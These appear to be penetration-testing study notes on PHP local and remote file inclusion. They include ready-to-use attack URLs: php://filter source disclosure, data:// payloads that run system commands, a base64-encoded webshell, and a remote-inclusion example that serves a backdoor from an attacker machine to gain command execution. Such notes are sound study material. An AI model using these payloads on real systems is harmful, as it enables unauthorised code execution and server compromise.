 The File Inclusion vulnerability allows an attacker to include a file into the application's running code. The objective is to perform a remote code execution (RCE).
 * Example: Assume you have a php file that takes in a URL parameter to include another file which contains some data to show or code. Then file inclusion in this case is placing a file of your choice into the php file executing any malicious code. Directory traversal also can be used to get the file.
 * Note: Don't confuse with directory traversal. Directory traversal is used to read files. File inclusion is about execution.
* Local File Inclusion (LFI): Inclusion of files or code that are locally present on a server. 
- PHP Wrappers: Similar to http or https protocol wrappers used in URL, there are other wrappers supported by PHP such as php:// and data://
	- php:// wrapper:
		- Example: hxxp://host/index.php?page=php://filter/resource=admin.php is the equivalent of hxxp://host/index.php?page=admin.php and also executes the code as in file inclusion.
		- Example: hxxp://host/index.php?page=php://filter/convert.base64-encode/resource=admin.php prints the base 64 version of admin.php. Effectively this means admin.php can be viewed without executing it. Instead of performing file inclusion, it only performs directory traversal to view the file.
		- The wrapper strength in attacking is to view the file without executing it which helps in looking at application logic.

	- data:// wrapper:
		- Example: hxxp://host/index.php?page=data://text/plain,<php%20echo%20system('ls');>" converts the php which is in url encoded format into plain text before going into index.php as input.
		- Example: hxxp://host/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" takes the base64 text to plain text which translates it to \<?php echo system($_GET["cmd"]);?\> before going into page URL parameter.
		- The wrapper strength in attacking is to perform file inclusion to execute code instead of searching for a local file to include.
		- Note: the allow_url_include setting needs to be enabled in php for the data:// wrapper to work and it is not enabled in default php installation.

- Remote File Inclusion (RFI): Same as LFI instead of including local files on a web server, RFI includes files from an remote system via http or SMB
	- Example: Create a web server using python server: "python3 -m http.server 80" on the attack machine. Use a webshell php file for RFI payload found on kali on /usr/share/webshells/php/simple-backdoor.php . In the target web server make the following request: "hxxp://mountaindesserts.com/meteor/index.php?page=hxxp://\<attack_machine_ip\>/simple-backdoor.php&cmd=ls"
